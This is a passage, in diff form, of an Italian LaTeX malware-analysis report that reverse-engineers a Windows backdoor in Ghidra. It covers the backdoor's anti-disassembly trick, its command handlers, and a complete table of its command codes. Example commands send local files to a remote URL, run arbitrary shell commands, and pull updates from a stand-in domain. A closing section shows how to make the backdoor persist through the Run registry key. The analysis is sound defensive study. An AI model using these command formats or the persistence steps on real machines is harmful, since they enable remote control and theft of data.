+            E' presente lo stesso loop di "dec/enc" (inversione) sul \texttt{\_tmpFileBuf} tramite XOR e una 
+            chiave
+            
+            \pic{adv_4_later_unkfn_decrypt}{Decryption/Encryption loop}{17.5cm}{4cm}
+
+            Questo punto non si capisce molto perchè viene eseguita una \texttt{DeleteFileA} con argomento
+            un array pieno di caratteri NUL e non si capisce a che serve il check \texttt{5 < DAT\_047802d5}:
+            
+            \pic{adv_4_later_unkfn_unkact}{Non si capisce molto cosa faccia}{12cm}{10cm}
+
+            E alla fine tramite un function pointer viene chiamata una funzione
+            
+            \pic{adv_4_later_unkfn_fptr_call}{Chiamata tramite function pointer (C syntax)}{17cm}{2.5cm}
+
+            In realtà, la jump non garantisce il \texttt{return}\dots
+            \pic{adv_4_later_unkfn_fptr_call_asm}{Nonconditional jump al function pointer (ASM syntax)}{17cm}{2.5cm}
+
+            \dots mentre è valido il return in figura \ref{fig:adv_4_later_unkfn_unkact}:
+            \pic{adv_4_later_unkfn_ret_asm}{\texttt{RET}}{15.5cm}{3cm}
+
+            \subsubsection{Prova della funzionalità}
+
+            Nonostante la presenza di \texttt{\_laterAction}, la funzionalità viene eseguita completamente \textbf{prima} dell'invio della stringa-esito al server di controllo.
+
+            Provando ad inviare il comando \texttt{4|http://www.google.com/index.html} si ottiene una
+            \texttt{"Plugin Execution Success"} ma senza un particolare output che indichi che cosa sia avvenuto.
+
+            \subsection{Meccanismo anti-disasm \texttt{UnknownPreExitActions}}\label{sect:antidisasm}
+            In riferimento alla figura \ref{fig:adv_5_later_epw}, la funzione chiamata prima di
+            \texttt{ExitProcess} contiene un meccanismo anti-disasm (in realtà il meccanismo potrebbe essere
+            stato iniettato volontariamente oppure no):
+            
+            \pic{unkpreexitact_decomp}{Call al function pointer}{15cm}{6cm}
+
+            Il meccanismo funziona perchè Ghidra non è in grado di determinare il valore che EDX assumerà
+            a runtime e quindi non sa a priori il punto nel quale salterà (per il funzionamento dell' 
+            interactive disassembler, porzioni di codice vengono disassemblate solo se raggiunte in qualche modo da 
+            altro codice)
+            \pic{unkpreexitact}{Calcolo funptr e jmp in listing disasm}{15cm}{5cm}
+
+            Effettuando disassemble sui bytes:
+
+            \pic{unkpreexitact_jmptable}{In base al valore di EDX, si può saltare in uno dei punti indicati}
+            {16cm}{15cm}
+
+            Le funzioni chiamate sono simili tra loro e fanno utilizzo di API Win32 tipo \texttt{ShellExecuteA}.
+
+            Il meccanismo è utilizzato in altri punti, ad esempio in figura \ref{fig:adv_4_later_unkfn_ret_asm}
+            
+        \section{Altro sui comandi già noti}
+
+            \subsection{Funzione "uninstall" (codice 7)}
+
+            Il comando uninstall fa quello che dice "straightforward": dopo aver inviato l'esito del comando
+            aspetta 2 sec, elimina il file sample.exe e quindi termina il processo corrente con codice 0
+
+            \pic{adv_known_7}{Abilita \texttt{\_laterAction} e invia risposta}{11cm}{4cm}
+
+            \pic{adv_known_7_later}{Procedi con l'uninstall}{15cm}{5cm}
+
+            \subsection{Funzione "sysinfo" (codice 6)}
+
+            Quella che Ghidra chiama \texttt{"functionCode"} (quello dentro l'else if) è il codice di versione ricavato con \texttt{atoi}:
+            \texttt{"301"} $\rightarrow$ $301_{10}$. Per ricavare version major, minor e fix si
+            estraggono centinaia, decine e unità dal numero decimale (si vedano arg. \texttt{sprintf})
+
+            \pic{adv_known_6_version}{\texttt{0x477c2d0} è \texttt{fmt}}{15cm}{7cm}
+
+            Dopo aver azzerato il buffer sullo stack, \texttt{persistencyMode}, è presente il 
+            meccanismo anti-disasm (sezione \ref{sect:antidisasm}), procedendo con il disassemble, vengono
+            copiate delle stringhe in questo buffer, in base al valore assunto da \texttt{idx} (è un qualche 
+            registro general purpose tipo EDX). Si veda la sezione \ref{sect:persist}.
+            
+            \pic{adv_known_6_persistencymode}{Buffer \texttt{persistencyMode} init-zeroed}{15cm}{5cm}
+
+            \pic{adv_known_6_persistencymode_cpy}{String copy (if-else if)}{12cm}{16cm}
+
+            Il valore di \texttt{GetModuleFileNameA} è in realtà inutilizzato, in quanto il malware usa come
+            buffer da passare alla \texttt{sprintf} finale, quello già presente in memoria e dove già ha la path a 
+            sample.exe.
+
+            \pic{adv_known_6_gun_gmfn}{\texttt{userName} utilizzata, ma non \texttt{module file name}}{10cm}{5cm}
+
+            Stringa di formato decodificata presa da un dump:
+
+            \pic{adv_known_6_fmtdecrypt}{\texttt{Version \%s Loggedon User: \%s\dots}}{15cm}{4cm}
+
+            Dopo \texttt{destBuf} e \texttt{fmt}, gli argomenti passati alla \texttt{sprintf} sono:
+
+            \pic{adv_known_6_sprintf}{\texttt{sprintf}}{15cm}{4cm}
+
+            \subsection{Funzione "cmd" (codice 3)}
+
+            In realtà sulla funzione $3$ sappiamo già molte cose, qualche dettaglio che è sfuggito. In riferimento alla figura \ref{fig:adv_known_3}:
+
+            \begin{enumerate}
+                \item Nel buffer \texttt{0x4781f66} viene memorizzato un path a un tmp file derivato secondo
+                le regole di \texttt{GetTempFilePath} (già viste)
+                \item Dato che viene usata \texttt{CreateProcessW} ma gli argomenti passati al comando
+                dall'utente sono ASCII, vanno effettuate delle conversioni in widechar
+                \item Il thread ha lo scopo di eseguire il comando e memorizzarne l'output. Viene passato
+                come argomento alla funzione da eseguire sul thread l'argomento del comando 3 in unicode che sarebbe il
+                comando da eseguire sul sistema.
+                \item La \texttt{WaitForSingleObject} rende il tutto come se fosse una normale chiamata a 
+                funzione "procedurale"
+                \item Il thread si occupa di "raccogliere" l'output dell'esecuzione del comando e buildare la stringa da inviare al server di controllo.
+                \item La \texttt{WaitForSingleObject} rende il tutto come se fosse una normale chiamata a 
+                funzione "procedurale"
+            \end{enumerate}
+
+            \pic{adv_known_3}{Codice eseguito dal dispatcher di comandi}{15cm}{8cm}
+
+            \underline{\textbf{Prima funzione \texttt{0x4753b30}, primo thread (esecuzione comando)}}
+
+            Alle \texttt{fwprintf} viene passato il puntatore al \texttt{FILE} \texttt{tmpFile}, la
+            stringa formato \texttt{"\%s"} e il buffer nella quale è stato letta la pipe (output del comando)
+             - scrive quindi nel tmp file
+
+            \pic{adv_known_3_fn1_writetmp}{Punto centrale: \texttt{fwprintf}}{16cm}{9cm}
+
+            La \href{https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-movefilea}{\texttt{MoveFileA}} rinomina poi il tmp file da \texttt{<NomeFile>} a \texttt{<NomeFile>\_fin}
+            
+            \pic{adv_known_3_fn1_movetmp}{Rinomina file e termina thread}{17cm}{4cm}
+
+            \underline{\textbf{Seconda funzione \texttt{0x4753f60}, secondo thread (esecuzione comando)}}
+
+            Ottiene la stringa \texttt{<NomeFile>\_fin}
+
+            \pic{adv_known_3_fn2_fmtnewtmp}{Build stringa path nuovo file}{19cm}{1.5cm}
+
+            Apre con \texttt{fopen} e poi legge quindi il contenuto del file \texttt{<NomeFile>\_fin}
+
+            \pic{adv_known_3_fn2_opennewtmp}{Apertura file in modalità lettura (testuale)}{14cm}{3cm}
+
+            \pic{adv_known_3_fn2_readnewtmp}{Lettura e concat stringa}{14cm}{7cm}
+
+            Il file \texttt{<NomeFile>\_fin} viene eliminato dopo averne copiato il contenuto da essere inviato
+            al server di controllo
+            
+            \pic{adv_known_3_fn2_end}{Terminazione secondo thread}{13cm}{5cm}
+
+            Quello visto in questa sezione è quindi, che oltre alle cose viste in sottosezione 
+            \ref{sect:moreabt3}, il comando 3:
+            \begin{enumerate}
+                \item Lancia due thread (ma è come se fossero due normali chiamate a procedura)
+                \item Esegue il comando
+                \item Scrive l'output del comando su un file temporaneo \texttt{"<NomeFile>"}
+                \item Rinomina il file temporaneo \texttt{"<NomeFile>"} $\rightarrow$ \texttt{"<NomeFile>\_fin"}
+                \item Legge il file temporaneo appena rinominato \texttt{"<NomeFile>\_fin"}
+                \item Inserisce il contenuto del file (che sarebbe l'output del cmd. eseguito) nella stringa-esito da inviare al server di controllo
+                \item Elimina il file temporaneo \texttt{"<NomeFile>\_fin"}
+            \end{enumerate}
+        
+        \section{Lista completa funzionalità offerte dal malware}
+
+        \begin{itemize}
+            \item \textbf{FileUpload} \textit{Carica un file su un server dal PC locale}
+            
+                UserCode: "1" (\texttt{functionCode = 1}) 
+                
+                Argomenti aggiuntivi?: Si
+                
+                ArgSplitterToken: whitespace 
+                
+                Arg1[Obbligatorio]: URL server remoto
+                
+                Arg2[Obbligatorio]: Path file su PC locale (deve includere carattere backslash)
+                
+                EsempioComando1: \texttt{1|http://example.com/home/index.html C:\textbackslash Windows\textbackslash System32\textbackslash cmd.exe}
+                
+                EsempioComando2: \texttt{1|http://example.com/index.html .\textbackslash myfilename.txt}
+                
+            \item \textbf{SetCommInterval} \textit{Imposta delay per la ricezione di nuovi comandi dopo aver
+            inviato una risposta}
+            
+                UserCode: "2" (\texttt{functionCode = 2}) 
+                
+                Argomenti aggiuntivi?: Si
+                
+                Arg1[Obbligatorio]: num. di minuti di delay
+                
+                EsempioComando1: \texttt{2|0}
+                
+                EsempioComando2: \texttt{2|4}
+
+            \item \textbf{RunSystemCommand} \textit{Lancia cmd.exe ed esegue un qualsiasi comando di Windows.
+            Risponde con stdout e stderr del comando}
+
+                UserCode: "3" (\texttt{functionCode = 3}) 
+                
+                Argomenti aggiuntivi?: Si
+                
+                Arg1[Obbligatorio]: Stringa di comando (passata per intero a cmd.exe)
+
+                EsempioComando1: \texttt{3|ping google.com}
+                
+                EsempioComando2: \texttt{3|sc query wuauserv}
+
+            \item \textbf{plugindl} \texttt{???}
+
+                ???
+
+            \item \textbf{Update} \textit{Rimpiazza al volo lo stub (sample.exe) sul filesystem, lancia il nuovo processo e termina quello corrente}
+
+                UserCode: "5" (\texttt{functionCode = 5})
+
+                Argomenti aggiuntivi?: Si
+
+                Arg1[Obbligatorio]: URL da cui reperire il malware aggiornato
+
+                EsempioComando1: \texttt{5|http://strange.domain.com/res/toys.png}
+
+            \item \textbf{SysInfo} \textit{Invia varie informazioni sul sistema}
+
+                UserCode: "6" (\texttt{functionCode = 6})
+
+                Argomenti aggiuntivi?: No
+
+                EsempioComando1: \texttt{6}
+
+            \item \textbf{Uninstall} \textit{Elimina lo stub (sample.exe) e termina il processo corrente}
+
+                UserCode: "7" (\texttt{functionCode = 7})
+
+                Argomenti aggiuntivi?: No
+
+                EsempioComando1: \texttt{7}
+
+            \item \textbf{EncDownload} \textit{Scarica file cifrato da server remoto, quindi decifralo}
+
+                UserCode: "8" (\texttt{functionCode = 8})
+
+                Argomenti aggiuntivi?: Si
+                
+                ArgSplitterToken: whitespace 
+                
+                Arg1[Obbligatorio]: URL server remoto
+                
+                Arg2[Obbligatorio]: Path file su PC locale
+
+                EsempioComando1: \texttt{8|http://example.com/home/blob/img.png C:\textbackslash Windows\textbackslash System32\textbackslash cmd.exe}
+
+            \item \textbf{FileDownload} \textit{Scarica un file da server a PC locale}
+            
+                UserCode: "9" (\texttt{functionCode = 0}) 
+                
+                Argomenti aggiuntivi?: Si
+                
+                ArgSplitterToken: whitespace 
+                
+                Arg1[Obbligatorio]: URL server remoto
+                
+                Arg2[Obbligatorio]: Path file su PC locale (deve includere carattere backslash)
+                
+                EsempioComando1: \texttt{9|http://example.com/home/index.html C:\textbackslash Windows\textbackslash System32\textbackslash cmd.exe}
+
+                EsempioComando2: \texttt{9|http://example.com/index.html .\textbackslash myfilename.txt}
+                
+        \end{itemize}
+
+        \section{Meccanismi di persistenza}\label{sect:persist}
+
+        Gli indirizzi delle \texttt{push} in figura \ref{fig:adv_known_6_persistencymode_cpy}, puntano
+        a queste stringhe:
+        
+        \pic{persistmodes}{Modalità di persistenza utilizzabili dal malware}{12cm}{7cm}
+
+        La jump sulla prima riga, sempre in figura \ref{fig:adv_known_6_persistencymode_cpy}, salta su una delle \texttt{push} 
+        in base al valore di \texttt{idx} (che sarebbe un registro, ma Ghidra gli ha assegnato un nome di 
+        variabile)
+        che per la calling convention usata, passa l'argomento della stringa source  a \texttt{strcpy} e 
+        come buffer destinatario l'indirizzo sullo stack di \texttt{persistencyMode} (in figura 
+        \ref{fig:adv_known_6_persistencymode}). 
+        
+        Per come viene usata, \texttt{persistencyMode}
+        indicherebbe, all'utilizzo del comando sysinfo, una delle modalità di persistenza usata dal malware.
+
+        Il problema è che di default il buffer \texttt{persistencyMode} è vuoto e quindi non è attivo alcun
+        meccanismo (evidente anche dal fatto che al riavvio del sistema il malware non è attivo, ad esempio 
+        attendendo connessioni tramite netcat), ma non è noto/esposto alcun modo da parte del malware per 
+        attivare uno dei meccanismi.
+
+        C'è comunque da dire che se lo stub viene eseguito con privilegi utente amministrativi, è
+        possibile in ogni caso manipolare il registro di sistema per modificare "a mano" la chiave contenuta 
+        nel registro di sistema:
+        
+        \texttt{HKEY\_LOCAL\_MACHINE\textbackslash Software\textbackslash Microsoft\textbackslash 
+        Windows\textbackslash CurrentVersion\textbackslash Run}
+
+        \begin{enumerate}
+            \item Uso funzionalità 6 per ottenere la path assoluta dello stub (sample.exe) nel filesystem
+            \item Uso poi la funzionalità 3 per eseguire il comando shell: \href{https://learn.microsoft.com/it-it/windows-server/administration/windows-commands/reg-add}{\texttt{reg add [...]}} per 
+            modificare il registro di sistema senza interfaccia grafica
+        \end{enumerate}
+        
+\end{document}
